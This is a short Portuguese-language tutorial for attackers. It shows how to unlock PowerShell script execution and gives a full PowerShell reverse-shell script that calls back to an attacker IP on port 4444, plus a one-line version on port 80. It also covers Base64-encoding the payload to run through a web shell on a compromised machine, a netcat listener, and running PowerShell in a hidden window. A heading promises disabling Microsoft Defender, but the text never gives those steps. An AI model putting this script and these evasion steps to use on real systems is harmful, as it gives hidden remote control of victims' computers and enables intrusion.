
Como Habilitar a Execução de Scripts

Abra o PowerShell como Administrador: Clique no menu Iniciar, digite PowerShell, clique com o botão direito sobre ele e selecione Executar como Administrador.

Verifique a política atual (opcional): Digite Get-ExecutionPolicy e pressione Enter. (Geralmente estará como Restricted, que bloqueia a execução).

Altere a permissão: Digite o comando abaixo e pressione Enter:Set-ExecutionPolicy Unrestricted

Confirme a alteração: O sistema exibirá um aviso de segurança. Digite S (para Sim) e pressione Enter.Agora, os seus scripts (.ps1) poderão ser executados normalmente.

Desabilitar Microsoft Defender

Salve este script como reverse.ps1 em sua máquina Kali.

$client = New-Object System.Net.Sockets.TCPClient('192.168.122.145',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex ". { $data } 2>&1" | Out-String ); 
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()}
$client.Close()

Codifique o conteúdo reverse.ps1em Base64:

#cat reverse.ps1 | iconv -t UTF-16LE | base64 -w 0

Agora que você tem o comando codificado em Base64, pode executá-lo no shell web do PowerShell na máquina comprometida. 

Use a seguinte sintaxe:

powershell -encodedcommand < String_Base64 >

Na sua máquina Kali, configure um ouvinte para capturar a conexão do shell reverso. Use o seguinte netcatpara isso:

nc  -lnvp  4444

Script de uma única linha 

$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

Ocultar janela do powershell via CMD

C:\>powershell -WindowStyle Hidden -File "C:\caminho\para\seu-script.ps1"
